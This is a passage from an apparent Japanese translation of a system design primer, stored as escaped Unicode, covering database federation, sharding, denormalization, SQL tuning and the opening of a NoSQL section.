\u306e\u3088\u3046\u306b\u4e09\u3064\u306b\u3059\u308b\u3053\u3068\u3067\u3001\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u4e00\u3064\u3042\u305f\u308a\u306e\u66f8\u304d\u8fbc\u307f\u30fb\u8aad\u307f\u53d6\u308a\u306e\u30c8\u30e9\u30d5\u30a3\u30c3\u30af\u304c\u6e1b\u308a\u3001\u305d\u306e\u7d50\u679c\u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306e\u30e9\u30b0\u3082\u77ed\u304f\u306a\u308a\u307e\u3059\u3002\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u304c\u5c0f\u3055\u304f\u306a\u308b\u3053\u3068\u3067\u3001\u30e1\u30e2\u30ea\u30fc\u306b\u53ce\u307e\u308b\u30c7\u30fc\u30bf\u304c\u5897\u3048\u307e\u3059\u3002\u30ad\u30e3\u30c3\u30b7\u30e5\u306e\u5c40\u6240\u6027\u304c\u9ad8\u307e\u308b\u305f\u3081\u3001\u30ad\u30e3\u30c3\u30b7\u30e5\u30d2\u30c3\u30c8\u7387\u3082\u4e0a\u304c\u308a\u307e\u3059\u3002\u5358\u4e00\u306e\u4e2d\u592e\u30de\u30b9\u30bf\u30fc\u3067\u66f8\u304d\u8fbc\u307f\u3092\u76f4\u5217\u5316\u3057\u305f\u308a\u3057\u306a\u3044\u305f\u3081\u3001\u4e26\u5217\u3067\u66f8\u304d\u8fbc\u307f\u3092\u51e6\u7406\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u3001\u30b9\u30eb\u30fc\u30d7\u30c3\u30c8\u306e\u5411\u4e0a\u304c\u671f\u5f85\u3067\u304d\u307e\u3059\u3002\n\n##### \u6b20\u70b9: federation\n\n* \u5927\u898f\u6a21\u306a\u51e6\u7406\u3084\u30c6\u30fc\u30d6\u30eb\u3092\u8981\u3059\u308b\u30b9\u30ad\u30fc\u30de\u306e\u5834\u5408\u3001\u30d5\u30a7\u30c7\u30ec\u30fc\u30b7\u30e7\u30f3\u306f\u52b9\u679c\u7684\u3068\u306f\u8a00\u3048\u306a\u3044\u3067\u3057\u3087\u3046\u3002\n* \u3069\u306e\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306b\u8aad\u307f\u66f8\u304d\u3092\u3059\u308b\u306e\u304b\u3092\u6307\u5b9a\u3059\u308b\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u30ed\u30b8\u30c3\u30af\u3092\u66f4\u65b0\u3057\u306a\u3051\u308c\u3070\u306a\u308a\u307e\u305b\u3093\u3002\n* [server link](http:\/\/stackoverflow.com\/questions\/5145637\/querying-data-by-joining-two-tables-in-two-database-on-different-servers)\u3067\u4e8c\u3064\u306e\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u304b\u3089\u306e\u30c7\u30fc\u30bf\u3092\u9023\u7d50\u3059\u308b\u306e\u306f\u3088\u308a\u8907\u96d1\u306b\u306a\u308b\u3067\u3057\u3087\u3046\u3002\n* \u30d5\u30a7\u30c7\u30ec\u30fc\u30b7\u30e7\u30f3\u3067\u306f\u8ffd\u52a0\u306e\u30cf\u30fc\u30c9\u30a6\u30a7\u30a2\u304c\u5fc5\u8981\u306b\u306a\u308a\u3001\u8907\u96d1\u6027\u3082\u5897\u3057\u307e\u3059\u3002\n\n##### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8: federation\n\n* [Scaling up to your first 10 million users](https:\/\/www.youtube.com\/watch?v=w95murBkYmU)\n\n#### \u30b7\u30e3\u30fc\u30c7\u30a3\u30f3\u30b0\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/wU8x5Id.png\"\/>\n  <br\/>\n  <i><a href=http:\/\/www.slideshare.net\/jboner\/scalability-availability-stability-patterns\/>Source: Scalability, availability, stability, patterns<\/a><\/i>\n<\/p>\n\n\u30b7\u30e3\u30fc\u30c7\u30a3\u30f3\u30b0\u3067\u306f\u7570\u306a\u308b\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306b\u305d\u308c\u305e\u308c\u304c\u30c7\u30fc\u30bf\u306e\u30b5\u30d6\u30bb\u30c3\u30c8\u65ad\u7247\u306e\u307f\u3092\u6301\u3064\u3088\u3046\u306b\u30c7\u30fc\u30bf\u3092\u5206\u5272\u3057\u307e\u3059\u3002\u30e6\u30fc\u30b6\u30fc\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u3092\u4f8b\u306b\u3068\u308b\u3068\u3001\u30e6\u30fc\u30b6\u30fc\u6570\u304c\u5897\u3048\u308b\u306b\u3064\u308c\u3066\u30af\u30e9\u30b9\u30bf\u30fc\u306b\u306f\u3088\u308a\u591a\u304f\u306e\u65ad\u7247\u304c\u52a0\u3048\u3089\u308c\u308b\u3053\u3068\u306b\u306a\u308a\u307e\u3059\u3002\n\n[federation](#federation)\u306e\u5229\u70b9\u306b\u4f3c\u3066\u3044\u3066\u3001\u30b7\u30e3\u30fc\u30c7\u30a3\u30f3\u30b0\u3067\u306f\u8aad\u307f\u66f8\u304d\u306e\u30c8\u30e9\u30d5\u30a3\u30c3\u30af\u3092\u6e1b\u3089\u3057\u3001\u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u3092\u6e1b\u3089\u3057\u3001\u30ad\u30e3\u30c3\u30b7\u30e5\u30d2\u30c3\u30c8\u3092\u5897\u3084\u3059\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\u30a4\u30f3\u30c7\u30c3\u30af\u30b9\u30b5\u30a4\u30ba\u3082\u6e1b\u3089\u3059\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\u4e00\u822c\u7684\u306b\u306f\u30a4\u30f3\u30c7\u30c3\u30af\u30b9\u30b5\u30a4\u30ba\u3092\u6e1b\u3089\u3059\u3068\u3001\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9\u304c\u5411\u4e0a\u3057\u30af\u30a8\u30ea\u901f\u5ea6\u304c\u901f\u304f\u306a\u308a\u307e\u3059\u3002\u306a\u306b\u304c\u3057\u304b\u306e\u30c7\u30fc\u30bf\u3092\u8907\u88fd\u3059\u308b\u6a5f\u80fd\u304c\u306a\u3051\u308c\u3070\u30c7\u30fc\u30bf\u30ed\u30b9\u306b\u3064\u306a\u304c\u308a\u307e\u3059\u304c\u3001\u3082\u3057\u3001\u4e00\u3064\u306e\u30b7\u30e3\u30fc\u30c9\u304c\u843d\u3061\u3066\u3082\u3001\u4ed6\u306e\u30b7\u30e3\u30fc\u30c9\u304c\u52d5\u3044\u3066\u3044\u308b\u3053\u3068\u306b\u306a\u308a\u307e\u3059\u3002\u30d5\u30a7\u30c7\u30ec\u30fc\u30b7\u30e7\u30f3\u3068\u540c\u3058\u304f\u3001\u5358\u4e00\u306e\u4e2d\u592e\u30de\u30b9\u30bf\u30fc\u304c\u66f8\u304d\u8fbc\u307f\u306e\u51e6\u7406\u3092\u3057\u306a\u304f\u3066\u3082\u3001\u4e26\u5217\u3067\u66f8\u304d\u8fbc\u307f\u3092\u51e6\u7406\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u3001\u30b9\u30eb\u30fc\u30d7\u30c3\u30c8\u306e\u5411\u4e0a\u304c\u671f\u5f85\u3067\u304d\u307e\u3059\u3002\n\n\u30e6\u30fc\u30b6\u30fc\u30c6\u30fc\u30d6\u30eb\u3092\u30b7\u30e3\u30fc\u30c9\u3059\u308b\u4e00\u822c\u7684\u306a\u65b9\u6cd5\u306f\u3001\u30e6\u30fc\u30b6\u30fc\u306e\u30e9\u30b9\u30c8\u30cd\u30fc\u30e0\u30a4\u30cb\u30b7\u30e3\u30eb\u3067\u30b7\u30e3\u30fc\u30c9\u3059\u308b\u304b\u3001\u30e6\u30fc\u30b6\u30fc\u306e\u5730\u7406\u7684\u914d\u7f6e\u3067\u30b7\u30e3\u30fc\u30c9\u3059\u308b\u306a\u3069\u3067\u3059\u3002\n\n##### \u6b20\u70b9: \u30b7\u30e3\u30fc\u30c7\u30a3\u30f3\u30b0\n\n* \u30b7\u30e3\u30fc\u30c9\u306b\u5bfe\u5fdc\u3059\u308b\u3088\u3046\u306b\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u30ed\u30b8\u30c3\u30af\u3092\u5909\u66f4\u3057\u306a\u3051\u308c\u3070\u306a\u308a\u307e\u305b\u3093\u3002\u7d50\u679c\u3068\u3057\u3066SQL\u30af\u30a8\u30ea\u304c\u8907\u96d1\u306b\u306a\u308a\u307e\u3059\u3002\n* \u30b7\u30e3\u30fc\u30c9\u3067\u306f\u30c7\u30fc\u30bf\u914d\u5206\u304c\u3044\u3073\u3064\u306b\u306a\u3063\u3066\u3057\u307e\u3046\u53ef\u80fd\u6027\u304c\u3042\u308a\u307e\u3059\u3002\u4f8b\u3048\u3070\u3001\u6a19\u6e96\u30e6\u30fc\u30b6\u30fc\u306e\u96c6\u5408\u3092\u6301\u3064\u30b7\u30e3\u30fc\u30c9\u304c\u3042\u308b\u5834\u5408\u3001\u305d\u306e\u30b7\u30e3\u30fc\u30c9\u304c\u4ed6\u306e\u30b7\u30e3\u30fc\u30c9\u3088\u308a\u3082\u91cd\u3044\u8ca0\u8377\u3092\u8ca0\u3046\u3053\u3068\u306b\u306a\u308a\u307e\u3059\u3002\n    * \u30ea\u30d0\u30e9\u30f3\u30b7\u30f3\u30b0\u3092\u3059\u308b\u3068\u8907\u96d1\u6027\u304c\u3088\u308a\u5897\u3057\u307e\u3059\u3002[consistent hashing](http:\/\/www.paperplanes.de\/2011\/12\/9\/the-magic-of-consistent-hashing.html) \u306b\u57fa\u3065\u3044\u305f\u30b7\u30e3\u30fc\u30c7\u30a3\u30f3\u30b0\u3067\u306f\u3001\u901a\u4fe1\u30c7\u30fc\u30bf\u3092\u524a\u6e1b\u3059\u308b\u3053\u3068\u3082\u3067\u304d\u307e\u3059\u3002\n* \u8907\u6570\u306e\u30b7\u30e3\u30fc\u30c9\u304b\u3089\u306e\u30c7\u30fc\u30bf\u3092\u9023\u7d50\u3059\u308b\u306e\u306f\u3088\u308a\u8907\u96d1\u3067\u3059\u3002\n* \u30b7\u30e3\u30fc\u30c7\u30a3\u30f3\u30b0\u3067\u306f\u8ffd\u52a0\u306e\u30cf\u30fc\u30c9\u30a6\u30a7\u30a2\u304c\u5fc5\u8981\u306b\u306a\u308a\u3001\u8907\u96d1\u6027\u3082\u5897\u3057\u307e\u3059\u3002\n\n##### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8: \u30b7\u30e3\u30fc\u30c7\u30a3\u30f3\u30b0\n\n* [\u30b7\u30e3\u30fc\u30c9\u306e\u767b\u5834](http:\/\/highscalability.com\/blog\/2009\/8\/6\/an-unorthodox-approach-to-database-design-the-coming-of-the.html)\n* [\u30b7\u30e3\u30fc\u30c9\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3](https:\/\/en.wikipedia.org\/wiki\/Shard_(database_architecture))\n* [Consistent hashing](http:\/\/www.paperplanes.de\/2011\/12\/9\/the-magic-of-consistent-hashing.html)\n\n#### \u975e\u6b63\u898f\u5316\n\n\u975e\u6b63\u898f\u5316\u3067\u306f\u3001\u66f8\u304d\u8fbc\u307f\u306e\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9\u3092\u3044\u304f\u3089\u304b\u72a0\u7272\u306b\u3057\u3066\u8aad\u307f\u8fbc\u307f\u306e\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9\u3092\u5411\u4e0a\u3055\u305b\u3088\u3046\u3068\u3057\u307e\u3059\u3002\u8a08\u7b97\u7684\u306b\u91cd\u3044\u30c6\u30fc\u30d6\u30eb\u306e\u7d50\u5408\u306a\u3069\u3092\u305b\u305a\u306b\u3001\u8907\u6570\u306e\u30c6\u30fc\u30d6\u30eb\u306b\u5197\u9577\u306a\u30c7\u30fc\u30bf\u306e\u30b3\u30d4\u30fc\u304c\u66f8\u304d\u8fbc\u307e\u308c\u308b\u306e\u3092\u8a31\u5bb9\u3057\u307e\u3059\u3002\u3044\u304f\u3064\u304b\u306eRDBMS\u4f8b\u3048\u3070\u3001[PostgreSQL](https:\/\/en.wikipedia.org\/wiki\/PostgreSQL) \u3084Oracle\u306f\u3053\u306e\u5197\u9577\u306a\u60c5\u5831\u3092\u53d6\u308a\u6271\u3044\u3001\u4e00\u8cab\u6027\u3092\u4fdd\u3064\u305f\u3081\u306e[materialized views](https:\/\/en.wikipedia.org\/wiki\/Materialized_view) \u3068\u3044\u3046\u6a5f\u80fd\u3092\u30b5\u30dd\u30fc\u30c8\u3057\u3066\u3044\u307e\u3059\u3002\n\n[\u30d5\u30a7\u30c7\u30ec\u30fc\u30b7\u30e7\u30f3](#federation) \u3084 [\u30b7\u30e3\u30fc\u30c7\u30a3\u30f3\u30b0](#\u30b7\u30e3\u30fc\u30c7\u30a3\u30f3\u30b0)\u306a\u3069\u306e\u30c6\u30af\u30cb\u30c3\u30af\u306b\u3088\u3063\u3066\u305d\u308c\u305e\u308c\u306e\u30c7\u30fc\u30bf\u30bb\u30f3\u30bf\u30fc\u306b\u5206\u914d\u3055\u308c\u305f\u30c7\u30fc\u30bf\u3092\u5408\u4e00\u3055\u305b\u308b\u3053\u3068\u306f\u3068\u3066\u3082\u8907\u96d1\u306a\u4f5c\u696d\u3067\u3059\u3002\u975e\u6b63\u898f\u5316\u306b\u3088\u3063\u3066\u305d\u306e\u3088\u3046\u306a\u8907\u96d1\u306a\u51e6\u7406\u3092\u3057\u306a\u304f\u3066\u6e08\u3080\u3088\u3046\u306b\u306a\u308a\u307e\u3059\u3002\n\n\u591a\u304f\u306e\u30b7\u30b9\u30c6\u30e0\u3067\u3001100\u5bfe1\u3042\u308b\u3044\u306f1000\u5bfe1\u304f\u3089\u3044\u306b\u306a\u308b\u304f\u3089\u3044\u8aad\u307f\u53d6\u308a\u306e\u65b9\u304c\u3001\u66f8\u304d\u8fbc\u307f\u306e\u30c8\u30e9\u30d5\u30a3\u30c3\u30af\u3088\u308a\u3082\u591a\u3044\u3053\u3068\u3067\u3057\u3087\u3046\u3002\u8aad\u307f\u8fbc\u307f\u3092\u884c\u3046\u305f\u3081\u306b\u3001\u8907\u96d1\u306a\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306e\u30b8\u30e7\u30a4\u30f3\u51e6\u7406\u304c\u542b\u307e\u308c\u308b\u3082\u306e\u306f\u8a08\u7b97\u7684\u306b\u9ad8\u4fa1\u306b\u3064\u304d\u307e\u3059\u3057\u3001\u30c7\u30a3\u30b9\u30af\u306e\u51e6\u7406\u6642\u9593\u3067\u81a8\u5927\u306a\u6642\u9593\u3092\u8cbb\u6d88\u3057\u3066\u3057\u307e\u3046\u3053\u3068\u306b\u306a\u308a\u307e\u3059\u3002\n\n##### \u6b20\u70b9: \u975e\u6b63\u898f\u5316\n\n* \u30c7\u30fc\u30bf\u304c\u8907\u88fd\u3055\u308c\u308b\u3002\n* \u5197\u9577\u306a\u30c7\u30fc\u30bf\u306e\u8907\u88fd\u304c\u540c\u671f\u3055\u308c\u308b\u3088\u3046\u306b\u5236\u7d04\u304c\u5b58\u5728\u3057\u3001\u305d\u306e\u3053\u3068\u3067\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u5168\u4f53\u306e\u8a2d\u8a08\u304c\u8907\u96d1\u5316\u3059\u308b\u3002\n* \u975e\u6b63\u898f\u5316\u3055\u308c\u305f\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306f\u904e\u5927\u306a\u66f8\u304d\u8fbc\u307f\u3092\u51e6\u7406\u3057\u306a\u3051\u308c\u3070\u306a\u3089\u306a\u3044\u5834\u5408\u3001\u6b63\u898f\u5316\u3055\u308c\u3066\u3044\u308b\u305d\u308c\u3088\u308a\u3082\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9\u306b\u304a\u3044\u3066\u52a3\u308b\u53ef\u80fd\u6027\u304c\u3042\u308b\u3002\n\n###### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8: \u975e\u6b63\u898f\u5316\n\n* [Denormalization](https:\/\/en.wikipedia.org\/wiki\/Denormalization)\n\n#### SQL\u30c1\u30e5\u30fc\u30cb\u30f3\u30b0\n\nSQL\u30c1\u30e5\u30fc\u30cb\u30f3\u30b0\u306f\u5e83\u7bc4\u306a\u77e5\u8b58\u3092\u5fc5\u8981\u3068\u3059\u308b\u5206\u91ce\u3067\u591a\u304f\u306e [\u672c](https:\/\/www.amazon.com\/s\/ref=nb_sb_noss_2?url=search-alias%3Daps&field-keywords=sql+tuning) \u304c\u66f8\u304b\u308c\u3066\u3044\u307e\u3059\u3002\n\n\u30dc\u30c8\u30eb\u30cd\u30c3\u30af\u3092\u660e\u3089\u304b\u306b\u3057\u3001\u30b7\u30df\u30e5\u30ec\u30fc\u30c8\u3059\u308b\u4e0a\u3067\u3001 **\u30d9\u30f3\u30c1\u30de\u30fc\u30af** \u3092\u5b9a\u3081\u3001 **\u30d7\u30ed\u30d5\u30a1\u30a4\u30eb** \u3059\u308b\u3053\u3068\u306f\u3068\u3066\u3082\u91cd\u8981\u3067\u3059\u3002\n\n* **\u30d9\u30f3\u30c1\u30de\u30fc\u30af** - [ab](http:\/\/httpd.apache.org\/docs\/2.2\/programs\/ab.html)\u306a\u3069\u306e\u30c4\u30fc\u30eb\u3092\u7528\u3044\u3066\u3001\u9ad8\u8ca0\u8377\u306e\u72b6\u6cc1\u3092\u30b7\u30df\u30e5\u30ec\u30fc\u30b7\u30e7\u30f3\u3057\u3066\u307f\u307e\u3057\u3087\u3046\u3002\n* **\u30d7\u30ed\u30d5\u30a1\u30a4\u30eb** - [slow query log](http:\/\/dev.mysql.com\/doc\/refman\/5.7\/en\/slow-query-log.html) \u306a\u3069\u306e\u30c4\u30fc\u30eb\u3092\u7528\u3044\u3066\u3001\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9\u72b6\u6cc1\u306e\u78ba\u8a8d\u3092\u3057\u307e\u3057\u3087\u3046\u3002\n\n\u30d9\u30f3\u30c1\u30de\u30fc\u30af\u3068\u30d7\u30ed\u30d5\u30a1\u30a4\u30eb\u3092\u3068\u308b\u3053\u3068\u3067\u4ee5\u4e0b\u306e\u3088\u3046\u306a\u52b9\u7387\u5316\u306e\u9078\u629e\u80a2\u3092\u3068\u308b\u3053\u3068\u306b\u306a\u308b\u3067\u3057\u3087\u3046\u3002\n\n##### \u30b9\u30ad\u30fc\u30de\u3092\u7d5e\u308b\n\n* MySQL\u306f\u30a2\u30af\u30bb\u30b9\u901f\u5ea6\u5411\u4e0a\u306e\u305f\u3081\u3001\u30c7\u30a3\u30b9\u30af\u4e0a\u306e\u9023\u7d9a\u3057\u305f\u30d6\u30ed\u30c3\u30af\u3078\u30c7\u30fc\u30bf\u3092\u683c\u7d0d\u3057\u3066\u3044\u307e\u3059\u3002\n* \u9577\u3055\u306e\u6c7a\u307e\u3063\u305f\u30d5\u30a3\u30fc\u30eb\u30c9\u306b\u5bfe\u3057\u3066\u306f `VARCHAR` \u3088\u308a\u3082 `CHAR` \u3092\u4f7f\u3046\u3088\u3046\u306b\u3057\u307e\u3057\u3087\u3046\u3002\n    * `CHAR` \u306e\u65b9\u304c\u52b9\u7387\u7684\u306b\u901f\u304f\u30e9\u30f3\u30c0\u30e0\u306b\u30c7\u30fc\u30bf\u306b\u30a2\u30af\u30bb\u30b9\u3067\u304d\u307e\u3059\u3002 \u4e00\u65b9\u3001 `VARCHAR` \u3067\u306f\u6b21\u306e\u30c7\u30fc\u30bf\u306b\u79fb\u308b\u524d\u306b\u30c7\u30fc\u30bf\u306e\u672b\u5c3e\u3092\u691c\u77e5\u3057\u306a\u3051\u308c\u3070\u306a\u3089\u306a\u3044\u305f\u3081\u306b\u901f\u5ea6\u304c\u72a0\u7272\u306b\u306a\u308a\u307e\u3059\u3002\n* \u30d6\u30ed\u30b0\u306e\u6295\u7a3f\u306a\u3069\u3001\u5927\u304d\u306a\u30c6\u30ad\u30b9\u30c8\u306b\u306f TEXT \u3092\u4f7f\u3044\u307e\u3057\u3087\u3046\u3002 TEXT \u3067\u306f\u30d6\u30fc\u30ea\u30a2\u30f3\u578b\u306e\u691c\u7d22\u3082\u53ef\u80fd\u3067\u3059\u3002 TEXT \u30d5\u30a3\u30fc\u30eb\u30c9\u306b\u306f\u3001\u30c6\u30ad\u30b9\u30c8\u30d6\u30ed\u30c3\u30af\u304c\u914d\u7f6e\u3055\u308c\u3066\u3044\u308b\u3001\u30c7\u30a3\u30b9\u30af\u4e0a\u306e\u5834\u6240\u3078\u306e\u30dd\u30a4\u30f3\u30bf\u30fc\u304c\u4fdd\u5b58\u3055\u308c\u307e\u3059\u3002\n* 2\u306e32\u4e57\u308440\u5104\u4ee5\u4e0b\u3092\u8d85\u3048\u306a\u3044\u7a0b\u5ea6\u306e\u5927\u304d\u306a\u6570\u306b\u306f INT \u3092\u4f7f\u3044\u307e\u3057\u3087\u3046\u3002\n* \u901a\u8ca8\u306b\u95a2\u3057\u3066\u306f\u5c0f\u6570\u70b9\u8868\u793a\u4e0a\u306e\u30a8\u30e9\u30fc\u3092\u907f\u3051\u308b\u305f\u3081\u306b `DECIMAL` \u3092\u4f7f\u3044\u307e\u3057\u3087\u3046\u3002\n* \u5927\u304d\u306a `BLOBS` \u3092\u4fdd\u5b58\u3059\u308b\u306e\u306f\u907f\u3051\u307e\u3057\u3087\u3046\u3002\u3069\u3053\u304b\u3089\u305d\u306e\u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u3092\u53d6\u3063\u3066\u304f\u308b\u3053\u3068\u304c\u3067\u304d\u308b\u304b\u306e\u60c5\u5831\u3092\u4fdd\u5b58\u3057\u307e\u3057\u3087\u3046\u3002\n* `VARCHAR(255)` \u306f8\u30d3\u30c3\u30c8\u3067\u6570\u3048\u3089\u308c\u308b\u6700\u5927\u306e\u6587\u5b57\u6570\u3067\u3059\u3002\u4e00\u90e8\u306eDBMS\u3067\u306f\u30011\u30d0\u30a4\u30c8\u306e\u5229\u7528\u52b9\u7387\u3092\u6700\u5927\u5316\u3059\u308b\u305f\u3081\u306b\u3053\u306e\u6587\u5b57\u6570\u304c\u3088\u304f\u4f7f\u308f\u308c\u307e\u3059\u3002\n* [\u691c\u7d22\u6027\u80fd\u5411\u4e0a\u306e\u305f\u3081](http:\/\/stackoverflow.com\/questions\/1017239\/how-do-null-values-affect-performance-in-a-database-search) \u3001\u53ef\u80fd\u3067\u3042\u308c\u3070 `NOT NULL` \u5236\u7d04\u3092\u8a2d\u5b9a\u3057\u307e\u3057\u3087\u3046\u3002\n\n##### \u30a4\u30f3\u30c7\u30c3\u30af\u30b9\u3092\u52b9\u679c\u7684\u306b\u7528\u3044\u308b\n\n* \u30af\u30a8\u30ea(`SELECT`\u3001 `GROUP BY`\u3001 `ORDER BY`\u3001 `JOIN`) \u306e\u5bfe\u8c61\u3068\u306a\u308b\u5217\u306b\u30a4\u30f3\u30c7\u30c3\u30af\u30b9\u3092\u4f7f\u3046\u3053\u3068\u3067\u901f\u5ea6\u3092\u5411\u4e0a\u3067\u304d\u308b\u304b\u3082\u3057\u308c\u307e\u305b\u3093\u3002\n* \u30a4\u30f3\u30c7\u30c3\u30af\u30b9\u306f\u901a\u5e38\u3001\u5e73\u8861\u63a2\u7d22\u6728\u3067\u3042\u308b[B\u6728](https:\/\/en.wikipedia.org\/wiki\/B-tree)\u306e\u5f62\u3067\u8868\u3055\u308c\u307e\u3059\u3002B\u6728\u306b\u3088\u308a\u30c7\u30fc\u30bf\u306f\u5e38\u306b\u30bd\u30fc\u30c8\u3055\u308c\u305f\u72b6\u614b\u306b\u306a\u308a\u307e\u3059\u3002\u307e\u305f\u691c\u7d22\u3001\u9806\u6b21\u30a2\u30af\u30bb\u30b9\u3001\u633f\u5165\u3001\u524a\u9664\u3092\u5bfe\u6570\u6642\u9593\u3067\u884c\u3048\u307e\u3059\u3002\n* \u30a4\u30f3\u30c7\u30c3\u30af\u30b9\u3092\u914d\u7f6e\u3059\u308b\u3053\u3068\u306f\u30c7\u30fc\u30bf\u3092\u30e1\u30e2\u30ea\u30fc\u306b\u6b8b\u3059\u3053\u3068\u306b\u3064\u306a\u304c\u308a\u3088\u308a\u5bb9\u91cf\u3092\u5fc5\u8981\u3068\u3057\u307e\u3059\u3002\n* \u30a4\u30f3\u30c7\u30c3\u30af\u30b9\u306e\u66f4\u65b0\u3082\u5fc5\u8981\u306b\u306a\u308b\u305f\u3081\u66f8\u304d\u8fbc\u307f\u3082\u9045\u304f\u306a\u308a\u307e\u3059\u3002\n* \u5927\u91cf\u306e\u30c7\u30fc\u30bf\u3092\u30ed\u30fc\u30c9\u3059\u308b\u969b\u306b\u306f\u3001\u30a4\u30f3\u30c7\u30c3\u30af\u30b9\u3092\u5207\u3063\u3066\u304b\u3089\u30c7\u30fc\u30bf\u3092\u30ed\u30fc\u30c9\u3057\u3066\u518d\u3073\u30a4\u30f3\u30c7\u30c3\u30af\u30b9\u3092\u30d3\u30eb\u30c9\u3057\u305f\u65b9\u304c\u901f\u3044\u3053\u3068\u304c\u3042\u308a\u307e\u3059\u3002\n\n##### \u9ad8\u8ca0\u8377\u306a\u30b8\u30e7\u30a4\u30f3\u3092\u907f\u3051\u308b\n\n* \u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9\u4e0a\u5fc5\u8981\u306a\u3068\u3053\u308d\u306b\u306f[\u975e\u6b63\u898f\u5316](#\u975e\u6b63\u898f\u5316)\u3092\u9069\u7528\u3059\u308b\n\n##### \u30c6\u30fc\u30d6\u30eb\u306e\u30d1\u30fc\u30c6\u30a3\u30b7\u30e7\u30f3\n\n* \u30c6\u30fc\u30d6\u30eb\u3092\u5206\u5272\u3057\u3001\u30db\u30c3\u30c8\u30b9\u30dd\u30c3\u30c8\u3092\u72ec\u7acb\u3057\u305f\u30c6\u30fc\u30d6\u30eb\u306b\u5206\u96e2\u3057\u3066\u30e1\u30e2\u30ea\u30fc\u306b\u4e57\u305b\u3089\u308c\u308b\u3088\u3046\u306b\u3059\u308b\u3002\n\n##### \u30af\u30a8\u30ea\u30ad\u30e3\u30c3\u30b7\u30e5\u3092\u8abf\u6574\u3059\u308b\n\n* \u5834\u5408\u306b\u3088\u3063\u3066\u306f[\u30af\u30a8\u30ea\u30ad\u30e3\u30c3\u30b7\u30e5](http:\/\/dev.mysql.com\/doc\/refman\/5.7\/en\/query-cache) \u304c[\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9\u554f\u984c](https:\/\/www.percona.com\/blog\/2014\/01\/28\/10-mysql-performance-tuning-settings-after-installation\/) \u3092\u5f15\u304d\u8d77\u3053\u3059\u53ef\u80fd\u6027\u304c\u3042\u308b\n\n##### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8: SQL\u30c1\u30e5\u30fc\u30cb\u30f3\u30b0\n\n* [MySQL\u30af\u30a8\u30ea\u3092\u6700\u9069\u5316\u3059\u308b\u305f\u3081\u306eTips](http:\/\/20bits.com\/article\/10-tips-for-optimizing-mysql-queries-that-dont-suck)\n* [VARCHAR(255)\u3092\u3084\u305f\u3089\u3088\u304f\u898b\u304b\u3051\u308b\u306e\u306f\u306a\u3093\u3067\uff1f](http:\/\/stackoverflow.com\/questions\/1217466\/is-there-a-good-reason-i-see-varchar255-used-so-often-as-opposed-to-another-l)\n* [null\u5024\u306f\u3069\u306e\u3088\u3046\u306b\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9\u306b\u5f71\u97ff\u3059\u308b\u306e\u304b\uff1f](http:\/\/stackoverflow.com\/questions\/1017239\/how-do-null-values-affect-performance-in-a-database-search)\n* [Slow query log](http:\/\/dev.mysql.com\/doc\/refman\/5.7\/en\/slow-query-log.html)\n\n### NoSQL\n\nNoSQL \u306f **key-value store**\u3001 **document-store**\u3001 **wide column store**\u3001 \u3082\u3057\u304f\u306f **graph database**\u306b\u3088\u3063\u3066\u8868\u73fe\u3055\u308c\u308b\u30c7\u30fc\u30bf\u30a2\u30a4\u30c6\u30e0\u306e\u96c6\u5408\u3067\u3059\u3002\u30c7\u30fc\u30bf\u306f\u4e00\u822c\u7684\u306b\u6b63\u898f\u5316\u3055\u308c\u3066\u304a\u3089\u305a\u3001\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u5074\u3067\u30b8\u30e7\u30a4\u30f3\u304c\u884c\u308f\u308c\u307e\u3059\u3002\u5927\u90e8\u5206\u306eNoSQL\u306f\u771f\u306eACID\u30c8\u30e9\u30f3\u30b6\u30af\u30b7\u30e7\u30f3\u3092\u6301\u305f\u305a\u3001 [\u7d50\u679c\u6574\u5408\u6027](#\u7d50\u679c\u6574\u5408\u6027) \u7684\u306a\u632f\u308b\u821e\u3044\u306e\u65b9\u3092\u597d\u307f\u307e\u3059\u3002\n\n**BASE** \u306f\u3057\u3070\u3057\u3070NoSQL\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306e\u30d7\u30ed\u30d1\u30c6\u30a3\u3092\u8aac\u660e\u3059\u308b\u305f\u3081\u306b\u7528\u3044\u3089\u308c\u307e\u3059\u3002[CAP Theorem](#cap-\u7406\u8ad6) 